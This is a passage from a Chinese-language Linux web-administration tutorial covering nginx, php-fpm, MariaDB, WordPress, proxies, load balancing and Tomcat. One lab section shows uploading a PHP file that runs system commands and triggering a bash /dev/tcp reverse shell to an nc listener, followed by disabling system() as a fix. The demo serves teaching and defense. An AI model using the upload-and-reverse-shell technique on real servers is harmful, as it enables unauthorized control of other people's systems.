#没有符号，代表模糊匹配，不支持正则 location /te 可以匹配te开头的目录和文件~ # 表示执行一个正则匹配，区分大小写~* # 表示执行一个正则匹配，不区分大小写= # 针对的是文件,精准匹配，不支持正则 server listen 80 default_server; server_name c.jaden.com; access_log /opt/nginx/c.jaden.com_log jaden; autoindex on; autoindex_exact_size off; location / root /web/three; index index.html index.htm; # 下面正则的意思是，只要用户访问txt文件，都返回404状态码。那么就可以做到各类文件的保护，或者各种路径访问的控制 location ~* ^.*\\.txt$ return 404; # 再比如：只要a/A开头的目录，不区分大小写，都不能访问location ~* /a+/ return 405; # 405是不允许访问的意思的状态码# 再比如：只要a开头的目录，区分大小写，不能访问location ~ /a+/ return 405; # 再比如：不能访问1.txt文件location = /1.txt return 405; 匹配符号的优先级 ## 符号优先级 = 大于 ~ 大于 ~* 大于 无符号touch jpg#配置文件符号优先级的例子： location ~ /jpg return 501; location = /jpg return 500; location ~* /Jpg return 503; location /Jpg return 505; 3.17.14 Nginx常用变量 3.17.15 refer防盗链referer的使用场景 ## 百度搜索--点击某个网站--收费## 盗链：你自己网站视频下载地址，被别人放到他的网站上了，别人从他网站上点击你的下载链接，下载动作和流量走的是你的服务器，他收获了人气，你损失了流量。通过referer请求头就可以防盗链。只要下载请求数据中的referer值不是你自己网站的网址，那就不让下载。 ## 防盗链设置[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf[root@web01 conf.d]# vim a.jaden.com.conf # 加上如下内容 location ~* \\.png$ if ( $http_referer !~* a.jaden.com ) #!~* 不包含的意思 return 403; # 并且将location中的站点根目录放到全局来 server listen 80; server_name a.jaden.com; access_log /opt/nginx/a.jaden.com_log jaden; # 站点根目录设置到location外面，表示所有的location的站点根目录都指向/web/one root /web/one; index index.html index.htm; location / #... #root /web/one; #index index.html index.htm; location ~* \\.png$ if ( $http_referer !~* a.jaden.com ) return 403; 重点变量： host #http请求头的host域名referer #从哪一个url跳转过来的user_agent #用户的浏览器客户端信息Connection #是否为长链接remote_addr #客户端的ipstatus #http的状态码 3.17.16 中英文自动匹配这个示例我们再做一个域名，比如yuyan.com。 # mkdir -p /html/lang/en# mkdir -p /html/lang/cn# cd /html/lang/en# vim index.html # 写点英文# cd /html/lang/cn# vim index.html # 写点汉字# hosts文件中加入yuyan.comserver listen 80; server_name yuyan.com; index index.htm index.html; charset utf-8; location / if ( $http_accept_language ~* ^en ) # 如果accept_language的值以en开头，也就是英文，那么返回英文的站点目录，否则返回中文的站点目录，而且有时候会根据ip地址来返回不同语言的网站。 root /html/lang/en; root /html/lang/cn; 3.17.17 Nginx+php做动态页面17-1 安装php-fpm#nginx和php要结合起来的话，需要安装php-fpmyum install php-fpm php-mbstring php-mysqlnd php-gd -y #php语言很多功能都依赖一些特定的插件，一般我们就叫做模块，这里我们安装一下，关于模块，讲解php的时候会给大家讲。插件的意思就是给某个东西安装一个插件，这个东西就具备了一些额外的能力。vim /etc/php-fpm.d/www.conf # 需要调整一些配置#修改39行和41行，用户和用户组都改为nginx，不然后面的各种操作会报错，权限问题user = nginxgroup = nginx# 改为之后，执行如下指令systemctl start php-fpm.service systemctl enable php-fpm.service# php-fmp服务启动之后，会开启一个9000端口[root@web01 ~]# netstat -lntuptcp 0 0 127.0.0.1:9000 0.0.0.0:* LISTEN 1611/php-fpm: maste ... 17-2 php-fpm的作用流程和Nginx配置 而nginx想要自动转发给php-fpm，需要给nginx做一些配置： # 比如我们再创建一个web站点[root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf www.wulaoban.top.conf yuyan.com.conf[root@web01 conf.d]# vim wulaoban.com.conf#添加上nginx连接php-fpm的配置，直接复制下面这一段就行server listen 80; server_name wulaoban.com; location / root /html/wulaoban; index index.php index.html index.htm; # 就是下面这这段配置：大家不需要研究昂，先知道一下即可 location ~ \\.php$ root /html/wulaoban; # 要和上面的站点根目录一致，或者放到全局去配置 fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/wulaoban$fastcgi_script_name; include fastcgi_params; # 创建站点根目录：/html/wulaoban[root@web01 conf.d]# mkdir /html/wulaoban# 检查配置：[root@web01 conf.d]# nginx -t# 重启nginx[root@web01 conf.d]# systemctl restart nginx# 我们去下载一个可道云的源代码来作为我们的站点吧：http://kodcloud.com/，下载方式看图 将代码放到我们的站点根目录中去解压一下： [root@web01 wulaoban]# cd /html/wulaoban/# 上传过来[root@web01 wulaoban]# lskodexplorer4.51.zip# 解压[root@web01 wulaoban]# unzip kodexplorer4.51.zip # 查看nginx和php-fpm的启动用户：[root@web01 wulaoban]# ps -ef |grep nginxroot 1697 1488 0 10:15 pts/0 00:00:00 grep --color=auto nginx# 发现都是nginx用户，但是我们wulaoban目录中的代码文件都是root用户：[root@web01 wulaoban]# ll总用量 14260drwxr-xr-x 10 root root 115 4月 11 12:29 app-rw-r--r-- 1 root root 91846 4月 11 12:28 ChangeLog.mddrwxr-xr-x 3 root root 74 4月 11 12:29 configdrwxr-xr-x 7 root root 72 4月 11 12:29 data-rw-r--r-- 1 root root 118 4月 11 12:28 index.php-rw-r--r-- 1 root root 14494333 4月 14 10:10 kodexplorer4.51.zipdrwxr-xr-x 15 root root 218 4月 11 12:29 plugins-rw-r--r-- 1 root root 8074 4月 11 12:28 README.MDdrwxr-xr-x 6 root root 57 4月 11 12:29 static# 这时候nginx用户是没有权限对这个目录进行上传文件等操作的，所以我们做一下权限修改。[root@web01 wulaoban]# chown -R nginx:nginx . # -R的意思是将当前目录的所有文件、文件夹及其子目录和子文件的用户和用户组都改为nginx。[root@web01 wulaoban]# ll总用量 14260drwxr-xr-x 10 nginx nginx 115 4月 11 12:29 app-rw-r--r-- 1 nginx nginx 91846 4月 11 12:28 ChangeLog.mddrwxr-xr-x 3 nginx nginx 74 4月 11 12:29 configdrwxr-xr-x 7 nginx nginx 72 4月 11 12:29 data-rw-r--r-- 1 nginx nginx 118 4月 11 12:28 index.php-rw-r--r-- 1 nginx nginx 14494333 4月 14 10:10 kodexplorer4.51.zipdrwxr-xr-x 15 nginx nginx 218 4月 11 12:29 plugins-rw-r--r-- 1 nginx nginx 8074 4月 11 12:28 README.MDdrwxr-xr-x 6 nginx nginx 57 4月 11 12:29 static# 然后查看一下我们的网站域名：[root@web01 wulaoban]# cat /etc/nginx/conf.d/wulaoban.com.conf server listen 80; server_name wulaoban.com; # 这是我们的域名 ...# 修改hosts文件，添加一条记录：192.168.61.139 wulaoban.com # 其他的域名我就先删除了，看着太乱。# 接下来就可以打开浏览器访问wulaoban.com域名了 3.17.18 漏洞演示能够看到网站的真实物理路径，那么这个事情就不太好，可以被利用，比如我们创建一个php文件在文档那个目录吧 比如文件叫做 jaden.php ，内容如下： ?php system(id) ? #php 可以执行操作系统指令 在我们的系统上是可以找到这个文件的目录的 [root@web01 wulaoban]# find /html -type f -name jaden.php/html/wulaoban/data/Group/public/home/文档/jaden.php[root@web01 wulaoban]# 那么我们基于浏览器就能直接访问： wulaoban.com 对应的就是 htmlwulaoban 这个真实物理路径： 这样就看到了它的系统信息，也就是你可以上传一个php文件对它的操作系统进行各种控制。比如直接拿一下它系统的控制终端，我们专业名字叫做反弹shell。 先在攻击主机上安装一个nv，并开启个nc监听 # 安装ncyum install nc -y# 开启nc监听nc -lvnp 9999 目标主机上执行：可以将下面的指令放到刚才的php文件中 xxxx -i /dev/tcp/192.168.61.148/9999 01 # 这个指令大家先不用管什么意思昂，后面再讲#xxxx表示bash，以防我们当前的文档被杀软杀掉，一些敏感的指令，我们分开写# 攻击机的ip地址：192.168.61.148# 攻击机nc监听的端口：9999 访问php文件，看到反弹的shell了： 可以设置禁用 system函数 ，如下 vim /etc/php.ini# 修改314行：314 disable_functions = system,eval# 重启php-fpm[root@web01 conf.d]# systemctl restart php-fpm.service # 然后再监听，再访问就发现反弹不了了。 3.18 session和cookisession 存储在服务器 [root@web01 conf.d]# cd /html/wulaoban/data/session/[root@web01 session]# lsindex.html sess_5hqvbhq6fqvbmtson44nvqmhe4 sess_e4s9ftmsahhp7v9n7cci8g81j4sess_3o9n4e45an60e77r1kl2s6gph7 sess_6v3je2a0ntfqoj7u19k365i103 sess_eebukpnijqghv3uami4cn9nup6#只要用户登录成功之后，服务就会自动创建一个session，其实这个网站是访问一下，不管有没有登录成功都会生成session数据#我们可以在客户端已经登录了的情况下，把session全部删掉，看一下客户端是否还是登录状态[root@web01 session]# rm -rf sess_*[root@web01 session]# lsindex.html# 登录一下看效果：[root@web01 session]# ll总用量 4-rwxrwxrwx 1 nginx nginx 0 4月 11 12:29 index.html-rwxrwxrwx 1 nginx nginx 395 4月 14 15:08 sess_3o9n4e45an60e77r1kl2s6gph7[root@web01 session]# cat sess_3o9n4e45an60e77r1kl2s6gph7 3.19 网站架构网站架构指的是一个网站的搭建环境：操作系统+软件+开发语言这么三个部分组成。而且很多情况下他们是常用的相对比较固定的组合。软件主要指的是中间件(主要指的是web服务应用程序)+数据库。 数据库：mysql\\oracle…数据库管理工具，也叫做数据库管理系统，DBMS：database manager system linux + nginx + mysql + php ## lnmp架构linux + apache + mysql + php ## lamp架构windows + apache + mysql + php ## wamp架构linux + nginx + mysql + tomcat ## lnmt架构 ，主要是跑java语言项目的，tomcat本身也是web服务程序，但是本身效率低，可以和nginx结合一起使用linux + nginx + mysql + uwsgi ## lnmu架构，主要是跑python语言项目的我们先捋清楚lnmp架构，其他的也就都简单了。 3.20 mysql#mysql以前是一款开源的软件，收费的商业版数据库是oracle，之前互联网发起了去ioe项目，o就是oracle，很贵。i是IBM硬件、E是EMC存储设备都很贵，所以好多公司发起了这个行动，这也是大家倾向于开源软件的一个原因。后来mysql发展很好，市场占有量也变的比较大了，国内用的特别多，oracle一看不行，10个亿美元收购了mysql，但是mysql的创始人没闲着，按照mysql的标准又创建了一个数据库软件，mariadb，和mysql的用法是基本一样的，所有的操作指令都是之前mysql的。maria是创始人的孙女。 安装数据库 安装数据库yum install mariadb-server mariadb -ysystemctl start mariadbsystemctl enable mariadb# mariadb启动之后会自动监听3306端口[root@web01 ~]# netstat -lntuptcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 1830/mysqld ... #可以看到服务还是叫做mysqld 数据库操作 #登录数据库mysql #输入mysql然后回车，就能在本机直接登录数据了[root@web01 ~]# mysql Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 2 Server version: 5.5.68-MariaDB MariaDB Server Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type help; or \\h for help. Type \\c to clear the current input statement. MariaDB [(none)] exit # exit是退出# 如果我们关闭了mariadb服务的话，在输入mysql就会报错[root@web01 ~]# systemctl stop mariadb.service [root@web01 ~]# mysqlERROR 2002 (HY000): Cant connect to local MySQL server through socket /var/lib/mysql/mysql.sock (2)#mysql登录进去就可以进行数据库操作了#数据库中有三个基本概念#库：存数据表的仓库，可以理解为一个网站一个仓库，他实际上对应着硬盘上的一个文件夹，每个库都有自己的名字#表：和excel表一样的表现形式来存储数据，二维表，他对应着文件夹中的一个文件，其实一个表需要多个文件来存储数据，每个表都有自己的名字#记录：表的第一行叫做表头，也叫做列名，剩下的行都是实际的数据。一行记录是一条数据，多数都会包含一个对象的全部描述信息#举例：比如下面这个表，水果表,fruit：id name price number1 苹果 11.00 202 香蕉 15.05 183 橘子 8.06 30 设置数据库密码 mysql use mysql;mysql UPDATE user SET password=password(test123) WHERE user=root;mysql flush privileges 简答的数据库操作 sql语句：结构化查询语句，数据库的操作指令#创建数据库create database wordpress;#删除数据库，工作中千万不要删除公司的数据库。drop database wordpress;#切换数据库use mysql#查看表show tables;#删除表drop table xxxxx;#查看所有数据select user,host,Password from user;#授权，如果没有这个用户，会自动创建，其实创建用户还有几种其他的方式#给普通用户授远程连接的权限：grant all on wordpress.* to wordpress@192.168.61.% identified by 123456;#给普通用户授本地登录的权限：默认主机名为localhost，我之前改了主机名叫做web01#grant all on wordpress.* to wordpress@主机名 identified by 123456;grant all on wordpress.* to wordpress@web01 identified by 123456;grant all on wordpress.* to wordpress@localhost identified by 123456;#使用普通用户登录mysql -u wordpress -p123456 -h 192.168.61.139#安全初始化mysql，这个先不执行了。mysql_secure_installation## 回车，n,一路y 3.21 wordpresswordpress是一个博客网站，我们来搭建一下，也是php开发的，使用的是mysql数据库。 前面mysql中我们已经创建了一个叫做wordpress的数据库，而且用户也授权好了，接下来我们搭建一个wordpress站点。 3.21.1 增加nginx的站点配置文件[root@web01 ~]# cd /etc/nginx/conf.d/[root@web01 conf.d]# lsa.jaden.com.conf b.jaden.com.conf c.jaden.com.conf wulanban.com.conf www.wulaoban.top.conf yuyan.com.conf#因为wordpress也是php开发的网站，我们复制一份wulanban.com.conf改一改就行[root@web01 conf.d]# cp wulanban.com.conf wp.jaden.com.conf[root@web01 conf.d]# vim wp.jaden.com.confserver listen 80; server_name wp.jaden.com; # 注意不要写wordpress.com，这个和官网地址冲突，改hosts文件可能都不行 location / root /html/wp; index index.php index.html index.htm; # 就是下面这这段配置：大家不需要研究昂，先知道一下即可 location ~ \\.php$ root /html/wp; # 要和上面的站点根目录一致，或者放到全局去配置 fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/wp$fastcgi_script_name; include fastcgi_params; # 保存之后，检查语法nginx -t# 重启nginxsystemctl restart nginx.service# 创建站点根目录mkdir /html/wp 3.21.2 上传wordpress源代码wordpress源代码我给大家准备好了，我这里有几个版本，安装如下这个版本即可，剩下的先留着 [root@web01 ~]# cd /html/wp/[root@web01 wp]# rz -Erz waiting to receive.[root@web01 wp]# lsWordPress-4.6.tar.gz[root@web01 wp]# tar xf WordPress-4.6.tar.gz [root@web01 wp]# lsWordPress-4.6 WordPress-4.6.tar.gz[root@web01 wp]# mv WordPress-4.6/* . # 将所有代码放到根目录下[root@web01 wp]# ll总用量 9764-rw-rw-r-- 1 root root 418 8月 17 2016 index.php-rw-rw-r-- 1 root root 19935 8月 17 2016 license.txt-rw-rw-r-- 1 root root 7342 8月 17 2016 readme.html...# 授权[root@web01 wp]# chown -R nginx:nginx .[root@web01 wp]# ll总用量 9764-rw-rw-r-- 1 nginx nginx 418 8月 17 2016 index.php-rw-rw-r-- 1 nginx nginx 19935 8月 17 2016 license.txt-rw-rw-r-- 1 nginx nginx 7342 8月 17 2016 readme.html...# 好，接下来就是修改一下hosts文件了192.168.61.139 wulaoban.com wp.jaden.com 3.22 伪静态## 纯静态网站，特点：没有交互、安全性好、速度快、方便SEO # 每个页面都有一个唯一的url地址，比如： https://www.cnblogs.com/clschao/articles/10526431.html https://www.cnblogs.com/clschao/articles/10391859.html # 不同的html文件看到一个不同的网页 ## 动态网站，特点：有交互、安全性相对差，速度相对慢、不方便SEO http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2 http://bbs.jaden.com/forum.php?mod=viewthreadtid=1extra=page%3D1 # http://bbs.jaden.com/forum.php网址是一样的，也就是服务端找的是同一个php文件，但是你会发现页面的数据不同了。 # 动态网站就是服务端根据客户端的网络请求数据中的查询参数数据来动态的给这个php文件加入不同的动态数据 ## 伪静态，特点：有交互、不安全、最速最慢、方便SEO # 实际上还是动态网站，只不过是做成了静态页面的网址效果。 ## 比如：http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2可能就变成了：http://bbs.jaden.com/2.html，结尾变成了html，并且没有查询参数了，而且看上去是一个页面一个html文件 discuz论坛配置伪静态 nginx添加伪静态的规则 [root@web01 conf.d]# cat discuz.conf server listen 80; server_name bbs.jaden.com; location / root /html/bbs; index index.php index.html index.htm; rewrite ^([^\\.]*)/topic-(.+)\\.html$ $1/portal.php?mod=topictopic=$2 last; rewrite ^([^\\.]*)/article-([0-9]+)-([0-9]+)\\.html$ $1/portal.php?mod=viewaid=$2page=$3 last; rewrite ^([^\\.]*)/forum-(\\w+)-([0-9]+)\\.html$ $1/forum.php?mod=forumdisplayfid=$2page=$3 last; rewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; rewrite ^([^\\.]*)/group-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=groupfid=$2page=$3 last; rewrite ^([^\\.]*)/space-(username|uid)-(.+)\\.html$ $1/home.php?mod=space$2=$3 last; rewrite ^([^\\.]*)/blog-([0-9]+)-([0-9]+)\\.html$ $1/home.php?mod=spaceuid=$2do=blogid=$3 last; rewrite ^([^\\.]*)/(fid|tid)-([0-9]+)\\.html$ $1/archiver/index.php?action=$2value=$3 last; rewrite ^([^\\.]*)/([a-z]+[a-z0-9_]*)-([a-z0-9_\\-]+)\\.html$ $1/plugin.php?id=$2:$3 last; if (!-e $request_filename) return 404; location ~ \\.php$ root /html/bbs; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /html/bbs$fastcgi_script_name; include fastcgi_params; 伪静态的原理 ## nginx会通过rewrite来重写一份新的url，产生一个动态的url来完成动态页面的效果## 默认模块页面： ## 动态url：http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2page=1 ## 伪静态url：http://bbs.jaden.com/forum-2-1.html ## 规则：rewrite ^([^\\.]*)/forum-(\\w+)-([0-9]+)\\.html$ $1/forum.php?mod=forumdisplayfid=$2page=$3 last; ## http://bbs.jaden.com/forum.php?mod=forumdisplayfid=2page=1 ## 帖子：## 动态：http://bbs.jaden.com/forum.php?mod=viewthreadtid=1extra=page%3D1## 伪静态：http://bbs.jaden.com/thread-1-1-1.html ## 规则：rewrite ^([^\\.]*)/thread-([0-9]+)-([0-9]+)-([0-9]+)\\.html$ $1/forum.php?mod=viewthreadtid=$2extra=page%3D$4page=$3 last; 3.23 正向代理客户端使用的代理我们一般称之为正向代理，服务端使用的代理我们一般称之为反向代理。 客户端如果使用了正向代理，那么服务端记录的是代理的ip地址，代理可以有很多层，而且很多网络是 正向代理和反向代理都存在。 比如客户端火狐浏览器配置代理的地方： 只要使用了代理，那么以后的访问都会走代理，而不会再直接发送给服务端。火狐浏览器可以设置自己使用代理，还可以使用系统代理： 我们做一个正向代理试试。 首先找一台服务器，比如我用阿里云的一台服务器作为正向代理服务器吧，安装一个centos7.8，然后安装个nginx # yum install nginx -y# 去掉配置用的#号行和空行[root@web01 conf.d]# grep -Ev ^$|# /etc/nginx/nginx.conf.default /etc/nginx/nginx.conf[root@web01 conf.d]# vim /etc/nginx/nginx.conf# 修改nginx的配置分别添加http和https的server，其他配置保持不变，我们就添加个http的演示一下即可# 将nginx.conf配置中的server部分替换为下面的server# 下面配置正向代理转发http请求server resolver 223.5.5.5; listen 80; location / proxy_pass http://$host$request_uri; proxy_set_header HOST $host; proxy_buffers 256 4k; proxy_max_temp_file_size 0k; proxy_connect_timeout 30; proxy_send_timeout 60; proxy_read_timeout 60; proxy_next_upstream error timeout invalid_header http_502; # nginx -t# systemctl restart nginx# 这时候的nginx就不代表一个网站了，只是帮我们进行请求的转发，就是单纯的代理。 通过实时查看nginx的访问日志，可以看到Windows下设置代理IP和端口后，本地电脑访问的所有网页会通过代理服务器进行访问网页，实现了正向代理的功能，并且隐藏了用户自己真实的IP。 3.24 反向代理反向代理更多的时候是为了保护原站，还能用于负载均衡的效果 我们再去克隆一个虚拟机作为反向代理服务器，使用nginx作为反向代理工具，安装nginx，配置如下： [root@lb01 ~]# cat /etc/nginx/nginx.confworker_processes 1;events worker_connections 1024;http include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server listen 80; server_name localhost; location / proxy_pass http://192.168.61.140; # 将请求转发到哪个ip地址，原站的ip地址，并且其实我们正常的话是应该加一个DNS解析记录，将我们的域名指向这个代理服务器的ip地址。我们没有真实公网主机来演示，所以改一下hosts文件的记录即可，将原来的域名都指向这个代理主机的ip地址。然后访问网站，wireshark抓包就能看到转发效果。 # 如果只是单纯的配置上面这句话也可以完成反向代理，但是服务端的其他网站就没办法访问到了，因为nginx转发的时候，会用客户端请求的服务器的ip地址，不会用域名，域名丢了，那么服务端的nginx会自动打开一个网站给你响应。所以还是要设置一下nginx转发时的host请求头，让它变成域名。 proxy_set_header Host $host; # 设置host，以防请求域名丢失。 #proxy_set_header jaden 666666; # 可以自定定制多个转发请求时的请求头键值对 # 下面这两个主要是为了记录客户端的真实ip地址，因为有了反向代理之后，我们看到记录的客户端的ip地址是反向代理服务器的ip地址，这样肯定不行呀，无法定位谁攻击的我，所以我们需要记录用户的真实ip，所以就可以在nginx转发请求的时候加两个请求头键值对，将客户端真实ip写进去 proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $remote_addr; # 这个简称叫做XFF，业内一般都用这个字段来记录客户端真实ip地址，也有用上面这个remote_addr来记录的，所以我们都配置上吧，将nginx的日志记录格式修改一下，加上一个真实ip：$http_x_forwarded_for #proxy_set_header X-Forwarded-For $http_x_forwarded_for; # 后端服务器日志格式,vim /etc/nginx/nginx.conf，加上如下两条log_format main $remote_addr - $remote_user [$time_local] $request $http_host $status $body_bytes_sent $http_referer $http_user_agent $http_x_forwarded_for;access_log /var/log/nginx/new.log main; # 给所有网站定义日志格式用的# 保存退出，然后访问网站，就看到日志了。 之前的网站服务器作为原站服务器，然后我们自己的物理机作为客户端访问。 3.25 负载均衡nginx做反向代理的同时，还可以配置负载均衡，为了演示负载均衡的效果，我们再创建一个web网站服务器。而且要保证这两台web服务器跑着相同的网站。两个网站简单写一些不太一样的东西，为了是让大家看效果。 修改nginx反向代理的配置： http include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; upstream web server 192.168.61.140; server 192.168.61.141; server listen 80; server_name localhost; location / proxy_pass http://web; # 这个地方不写死ip地址了，写个上面配置中的upstream的名称 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $http_x_forwarded_for; 3.26 Tomcat3.26.1 Tomcat安装Java介绍 # java是sun公司开发，后来sun公司被甲骨文oracle公司收购了，所以现在java属于oracle公司。每个android上面都是跑的java虚拟机，运行着各种java项目。# jvm：Java Virtual Machine，加成jvm，叫做java虚拟机# jre：Java Runtime Environment，简称JRE，叫做java运行环境，jre里面包含jvm。# jdk：Java Development Kit，简称jdk，叫做java开发工具包，包含jre和很多开发时会用到的辅助软件# 如果只是单纯想运行java的项目，就安装jre即可，如果想开发java项目或者配合一些其他工具软件来使用，那就需要安装jdk，大家一般都会安装jdk。# jdk有很多版本：早先jdk6比较流行，但是漏洞比较多，jdk6，官方叫做jdk1.6，后来有了jdk7，官方叫做1.7，直接jdk8，jdk9、jdk10...，最新版本现在是jdk20了，看官网：https://www.oracle.com/java/technologies/downloads/，jdk8、11、17都是LTS长期技术支持版本，很多公司都喜欢用这种长期支持版本。老项目还有一些用的jdk6\\7等，jdk本身漏洞就比较多。 方法1：我们就使用这个方法来安装吧：tomcat的运行需要java环境，所以先安装jdk。 把如下两个安装包放到虚拟机上，这两个包我都给大家准备好了。 按照下面的步骤进行安装 # 这个方法适用于redhat系列的系统# 我们克隆一个优化好之后的centos7.8虚拟机来安装吧rpm -ivh jdk-8u102-linux-x64.rpm #8u102表示jdk8，u表示更新，102表示是第102次更新，每次更新都是在补漏洞mkdir /app -ptar xf apache-tomcat-8.0.27.tar.gz -C /app #apache-tomcat-8.0.27.tar.gz是编译好的tomcat程序了。/app/apache-tomcat-8.0.27/bin/startup.sh # 解压之后，执行这个指令就能启动了 tomcat就安装好了，直接浏览器访问即可：tomcat的默认端口是8080，记住昂，我们安装的是8.0.72版本，tomcat属于apache基金会的软件，所以前面会带有apache字眼。 方法2：这种方法比较繁琐，需要配置环境变量，将java配置到环境变量中，不然没办法运行java。方法1自动帮我们配置了 #这个方法适用于debian和ubuntu等其他linux发行版，其实所有的linux系统都可以用下面的方式安装tar xf jdk-8u60-linux-x64.tar.gz -C /app/ln -s /app/jdk1.8.0_60 /app/jdksed -i.ori $a export JAVA_HOME=/app/jdk export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH export CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar /etc/profilesource /etc/profilemkdir /app/tar xf apache-tomcat-8.0.27.tar.gz -C /app/app/apache-tomcat-8.0.27/bin/startup.sh 3.26.2 tomcat目录结构介绍[root@tomcat apache-tomcat-8.0.27]# ll # 和linux目录有点类似total 92drwxr-xr-x 2 root root 4096 Aug 3 03:05 bin #主要包含启动、关闭tomcat脚本和脚本依赖文件 非常重要drwxr-xr-x 3 root root 198 Aug 3 03:05 conf #tomcat配置文件目录，里面都是xml格式的配置文件 非常重要drwxr-xr-x 2 root root 4096 Aug 3 03:05 lib #tomcat运行需要加载的jar包，都是一些关键插件 非常重要-rw-r--r-- 1 root root 57011 Sep 28 2015 LICENSE #license文件，不重要drwxr-xr-x 2 root root 197 Aug 3 03:15 logs #在运行过程中产生的日志文件 非常重要-rw-r--r-- 1 root root 1444 Sep 28 2015 NOTICE #不重要-rw-r--r-- 1 root root 6741 Sep 28 2015 RELEASE-NOTES #版本特性，不重要-rw-r--r-- 1 root root 16204 Sep 28 2015 RUNNING.txt #帮助文件，不重要drwxr-xr-x 2 root root 30 Aug 3 03:05 temp #存放临时文件drwxr-xr-x 7 root root 81 Sep 28 2015 webapps #站点目录 非常重要drwxr-xr-x 3 root root 22 Aug 3 03:05 work #tomcat运行时产生的缓存文件[root@192 etc]# ls /app/apache-tomcat-8.0.27/ bin conf lib LICENSE logs NOTICE RELEASE-NOTES RUNNING.txt temp webapps work [root@192 etc]# ls /app/apache-tomcat-8.0.27/bin/ bootstrap.jar commons-daemon-native.tar.gz digest.sh startup.bat tool-wrapper.sh catalina.bat configtest.bat setclasspath.bat startup.sh version.bat catalina.sh configtest.sh setclasspath.sh tomcat\u0002juli.jar version.sh catalina-tasks.xml daemon.sh shutdown.bat tomcat\u0002native.tar.gz commons-daemon.jar digest.bat shutdown.sh tool\u0002wrapper.bat # bin目录中的jar文件是tomcat启动时自动加载的一些关键文件。# .jar结尾的文件：java源代码打包出来之后都是.jar结尾的文件，叫做jar包，jar包就是 Java Archive File，顾名思义，它的应用是与 Java 息息相关的，是 Java 的一种文档格式，是一种与平台无关的文件格式，可将多个文件合成一个文件。jar 包与 zip 包非常相似——准确地说，它就是 zip 包，所以叫它文件包。jar 与 zip 唯一的区别就是在 jar 文件的内容中，包含了一个 META-INF/MANIFEST.MF 文件，该文件是在生成 jar 文件的时候自动创建的，作为jar里面的详情单，包含了该Jar包的版本、创建人和类搜索路径Class-Path等信息，当然如果是可执行Jar包，会包含Main-Class属性，表明Main方法入口，尤其是较为重要的Class-Path和Main-Class。jar 包是通过 JavaSE 程序打成的包，一般是为了将一些公共的java功能代码打包成一个jar包，那么其他项目直接引用这个jar包就能使用这个功能。# .xml结尾的文件：和html很类似，也是一种标签语言 3.26.3 Java项目的部署3-1 使用war包不是zrlogzrlog是个博客网站，我们可以下载来部署一下，这个网站会用到数据库。 jar包除了可以打包一些java编写的特定功能的插件之外，在项目部署方面用的也比较多，用jar包做项目部署的时候，一般jar包中会直接打包上webserver的程序，比如tomcat，所以直接运行jar包，项目就运行起来了，不需要去安装tomcat之类的webserver。jar 包是通过 JavaSE 程序打成的包。 war包是在网站项目部署的时候用的比较多，它也是打包的java源代码程序，但是里面是站点源代码，不包含webserver程序。war包是 https://www.zrlog.com/，可以自行下载war包。war 包是 JavaWeb 程序打的包。 ## 部署一下上面这个文件。注意，如果你的tomcat服务器重新启动过，执行这个指令来启动tomcat /app/apache-tomcat-8.0.27/bin/startup.sh[root@192 etc]# cd /app/apache-tomcat-8.0.27/webapps/[root@192 webapps]# ls docs examples host-manager manager ROOT[root@192 webapps]# rz -E rz waiting to receive.[root@192 webapps]# ls # war包上传过来之后，tomcat会自动帮我们解压war包，如果你ls查看不到，稍等一会就看到了，解压出来的zrlog目录docs examples host-manager manager ROOT zrlog zrlog.war# 然后就可以直接访问网站了 但是需要我们填写一些数据库的信息，我们还没有，需要安装并创建数据库。 yum install mariadb-server -y[root@localhost webapps]# systemctl start mariadb.service [root@localhost webapps]# systemctl enable mariadb.service [root@localhost webapps]# mysql_secure_installation # 做一下安全初始化吧，连接起来更顺畅# 安全初始化的过程中设置一个root密码吧，我设置的是123456，剩下的一路y即可# 连接一下看效果：[root@localhost webapps]# mysql -u root -p123456# 创建数据库MariaDB [(none)] create database zrlog;Query OK, 1 row affected (0.00 sec)MariaDB [(none)] show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || zrlog |+--------------------+4 rows in set (0.00 sec)MariaDB [(none)] exit 然后回到网站进行初始化： 3-2 使用jar部署小说网站下载个打包为jar包的web项目代码来部署一下吧。 https://github.com/hectorqin/reader/releases/tag/v2.6.2，下载这个项目，如下，不下载最新的，最 新的需要授权才能下载。 然后可以看一下官方文档，里面有部署教程： # 先关闭tomcat，不然有冲突，因为这个jar运行起来之后使用的也是8080端口[root@localhost webapps]# /app/apache-tomcat-8.0.27/bin/shutdown.shcd /opt/ # 随便找个目录，比如就opt吧#上传刚才下载的jar包到opt目录下# 然后执行如下指令：java -jar reader-$version.jar --reader.app.secure=true --reader.app.secureKey=管理密码 --reader.app.inviteCode=注册邀请码# 指令稍作调整，管理员密码：12345678，注册邀请码8888，reader-$version.jar改为我们下载的包名reader-2.6.2.jar，默认的管理员名称为defaultjava -jar reader-2.6.2.jar --reader.app.secure=true --reader.app.secureKey=12345678 --reader.app.inviteCode=8888# java -jar reader-2.6.2.jar #直接运行这个指令是单用户模式启动网站。 3.26.4 maven编译java源代码 